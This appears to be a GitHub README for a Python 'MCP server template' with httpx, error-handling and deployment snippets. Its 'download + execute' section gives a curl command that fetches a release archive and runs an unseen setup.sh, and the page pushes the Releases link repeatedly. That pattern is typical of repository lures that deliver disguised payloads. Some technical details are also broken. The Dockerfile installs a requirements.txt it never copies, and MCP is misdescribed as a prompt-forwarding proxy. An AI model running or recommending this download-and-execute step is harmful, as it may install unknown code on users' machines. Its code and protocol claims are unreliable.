https://github.com/gussxsx/mcp-server-template/releases

# MCP Server Template — Production-ready Python Server for Claude 🤖🚀

[![Release](https://img.shields.io/github/v/release/gussxsx/mcp-server-template.svg?style=for-the-badge&label=release&color=0EA5A4)](https://github.com/gussxsx/mcp-server-template/releases)
[![Python](https://img.shields.io/badge/python-3.9%2B-blue?style=flat-square)](#)
[![Topics](https://img.shields.io/badge/topics-ai--integration%20%7C%20mcp%20%7C%20httpx-lightgrey?style=flat-square)](#)

![AI server illustration](https://images.unsplash.com/photo-1555949963-aa79dcee9810?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1f8392b46fd2ae7ac6b9dd6e2c3f496e)

A production-ready template for building Model Context Protocol (MCP) servers with Python. This repo shows patterns for async HTTP clients, error handling, connection pooling, and clean separation of concerns. Use it as a starting point for integrating REST APIs with Claude and other MCP-compatible tools.

Topics: ai-integration, ai-tools, anthropic, api-client, async-python, asyncio, claude, http-client, httpx, mcp, mcp-server, model-context-protocol, production-ready, python, python-template, rest-api, server-template, template

- Releases: https://github.com/gussxsx/mcp-server-template/releases

Table of contents
- Features
- Who this is for
- Architecture
- Quickstart
- Install from Releases (download + execute)
- Patterns and code examples
  - HTTP client patterns
  - Connection pooling
  - Error handling
  - Separation of concerns
- Example: Integrate a REST API with Claude
- Testing and CI
- Deployment
- Contributing
- License
- Maintainers

Features
- Async-first Python template using asyncio and httpx.
- Clean MCP handler scaffolding for request/response flow.
- Standardized error types and mapping to HTTP and MCP error payloads.
- Connection pooling tuned for long-lived AI sessions.
- Example integrations and end-to-end tests.
- Dockerfile and k8s manifest examples for production.
- Type hints and simple schema validation (pydantic or dataclasses).

Who this is for
- Backend engineers building an MCP adapter for Claude or other model hosts.
- Teams who need a consistent HTTP client layer for AI calls.
- Developers who want an async, testable server template for REST + MCP.

Architecture (high level)
- api/ — MCP HTTP endpoints and routing.
- clients/ — HTTP client wrappers for upstream REST APIs.
- core/ — MCP logic, context handling, model request/response mapping.
- services/ — Business logic, retries, rate limits.
- tests/ — Unit and integration tests.
- infra/ — Docker, k8s, terraform samples.

Design goals
- Keep business code separate from transport.
- Make HTTP client swap simple (httpx, aiohttp).
- Provide safe defaults for connection pooling and timeouts.
- Provide clear error translation from upstream errors to MCP errors.
- Keep code small and easy to reason about.

Quickstart (developer)
1. Clone the repo.
2. Create a virtualenv and install dependencies.
3. Configure environment variables.
4. Run tests.
5. Start the dev server.

Example commands
```bash
git clone https://github.com/gussxsx/mcp-server-template.git
cd mcp-server-template
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pytest
uvicorn api.app:app --reload
```

Install from Releases (download + execute)
- Download the latest release archive from the Releases page and execute the included setup script. The release contains a packaged starter app and a setup script you must run locally to bootstrap a dev environment.

Commands (example)
```bash
# Download the release archive and extract it
curl -L -o mcp-server-template-release.tar.gz "https://github.com/gussxsx/mcp-server-template/releases/latest/download/mcp-server-template-release.tar.gz"
tar xzf mcp-server-template-release.tar.gz
# Run the included bootstrap script
cd mcp-server-template-release
chmod +x setup.sh
./setup.sh
```

If the Releases page changes, check the Releases section on the repository: https://github.com/gussxsx/mcp-server-template/releases

HTTP client patterns (httpx, async)
- Use a single shared httpx.AsyncClient per process or per worker.
- Use a connection pool and keep-alive to reduce latency.
- Centralize request/response logging and metrics.

Example httpx client wrapper
```python
# clients/base_client.py
from httpx import AsyncClient, Limits, Timeout

class BaseClient:
    def __init__(self, base_url: str, max_connections: int = 25):
        limits = Limits(max_connections=max_connections, max_keepalive_connections=max_connections)
        timeout = Timeout(10.0)
        self.client = AsyncClient(base_url=base_url, limits=limits, timeout=timeout)

    async def get(self, path: str, **kwargs):
        resp = await self.client.get(path, **kwargs)
        resp.raise_for_status()
        return resp.json()

    async def post(self, path: str, json: dict, **kwargs):
        resp = await self.client.post(path, json=json, **kwargs)
        resp.raise_for_status()
        return resp.json()
```

Connection pooling and tuning
- Set Limits(max_connections, max_keepalive_connections).
- Tune timeouts: connect, read, write, pool.
- Close the AsyncClient on shutdown.

Example lifecycle (FastAPI)
```python
# api/app.py
from fastapi import FastAPI
from clients.base_client import BaseClient

app = FastAPI()
upstream = BaseClient("https://api.example.com", max_connections=50)

@app.on_event("shutdown")
async def shutdown_event():
    await upstream.client.aclose()
```

Error handling and mapping
- Translate upstream HTTP errors into MCP error shapes.
- Use typed exceptions for common cases: TimeoutError, UpstreamAuthError, UpstreamRateLimit.
- Map internal exceptions to standard MCP error codes and status codes.

Error mapping example
```python
# core/errors.py
class MCPError(Exception):
    code: str
    status: int

class UpstreamTimeout(MCPError):
    code = "upstream_timeout"
    status = 504

class UpstreamAuth(MCPError):
    code = "upstream_auth"
    status = 502
```

Separation of concerns
- Keep API handlers thin.
- Put request validation, mapping, and orchestrations in core/services.
- Keep raw HTTP calls in clients/.

Example handler
```python
# api/handlers.py
from fastapi import APIRouter, Request
from core.services import run_model_request

router = APIRouter()

@router.post("/mcp")
async def mcp_endpoint(req: Request):
    body = await req.json()
    response = await run_model_request(body)
    return response
```

Example: Integrate a REST API with Claude
- Use the MCP model request as the canonical input.
- Transform the MCP request into the upstream API payload.
- Call the upstream API via the client wrapper.
- Translate the upstream response into an MCP response.

Flow diagram (text)
- MCP request -> validate -> map to upstream -> http client -> parse response -> map to MCP response -> return

Code sketch
```python
# core/mapper.py
def mcp_to_upstream(mcp_payload: dict) -> dict:
    return {
        "prompt": mcp_payload["context"],
        "max_tokens": mcp_payload.get("max_tokens", 512)
    }

def upstream_to_mcp(upstream_json: dict) -> dict:
    return {
        "output": upstream_json.get("text"),
        "metadata": {"usage": upstream_json.get("usage")}
    }
```

Streaming responses
- If you stream tokens from the upstream, adapt the streaming protocol into MCP streaming frames.
- Use chunked transfer or server-sent events for streaming clients.

Retries and backoff
- Centralize retry logic in the clients or a separate retry helper.
- Use exponential backoff and jitter for transient errors.
- Limit retries for idempotent calls and avoid retries for 4xx auth errors.

Observability and metrics
- Export key metrics: request latency, error count, upstream latency, pool utilization.
- Use lightweight logging with structured fields: request_id, model, upstream_id.
- Integrate with Prometheus or any monitoring backend.

Testing
- Use pytest and asyncio support.
- Mock httpx.AsyncClient with respx for HTTP tests.
- Test mapping logic and error translation in unit tests.
- Provide a minimal integration test that runs the app and mocks upstream.

Example test
```python
# tests/test_mapper.py
import pytest
from core.mapper import mcp_to_upstream, upstream_to_mcp

def test_mapping_roundtrip():
    mcp = {"context": "Hello", "max_tokens": 8}
    up = mcp_to_upstream(mcp)
    assert up["prompt"] == "Hello"
    resp = {"text": "Hi"}
    mcp_resp = upstream_to_mcp(resp)
    assert mcp_resp["output"] == "Hi"
```

Deployment (production)
- Pack your app in a minimal image. Use slim Python base image.
- Run a process manager (uvicorn + gunicorn worker class) for multiple workers.
- Tune worker count for CPU and memory usage.
- Set HTTP keepalive in both server and upstream clients.
- Use liveness and readiness probes in Kubernetes.

Dockerfile example
```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY pyproject.toml poetry.lock ./
RUN pip install --upgrade pip && pip install -r requirements.txt
COPY . .
CMD ["uvicorn", "api.app:app", "--host", "0.0.0.0", "--port", "8080", "--workers", "3"]
```

Kubernetes hints
- HorizontalPodAutoscaler on CPU or custom metrics.
- Limit max connections per pod to avoid upstream overload.
- Configure pod resources and request limits for predictable pooling.

Security
- Avoid logging full user prompts.
- Protect secrets using environment variables or a secret store.
- Fail fast on invalid upstream credentials.

Contributing
- Follow the code style. Tests must pass.
- Add integration tests for new client integrations.
- Open issues for feature requests or bugs.
- Use PRs with small, focused changes.

Repository layout (example)
- api/ — FastAPI handlers, routers, middleware
- clients/ — httpx wrappers, retry helpers
- core/ — mapping, errors, business logic
- infra/ — Dockerfile, k8s manifests, CI scripts
- tests/ — unit and integration tests
- docs/ — design notes, MCP mapping docs

Useful links
- Releases and packaged starter: https://github.com/gussxsx/mcp-server-template/releases
- Model Context Protocol (MCP) docs: https://example.org/mcp-docs
- httpx docs: https://www.python-httpx.org

License
- MIT License. See LICENSE file for details.

Maintainers
- gussxsx (repo owner)
- community contributors (see CONTRIBUTORS.md)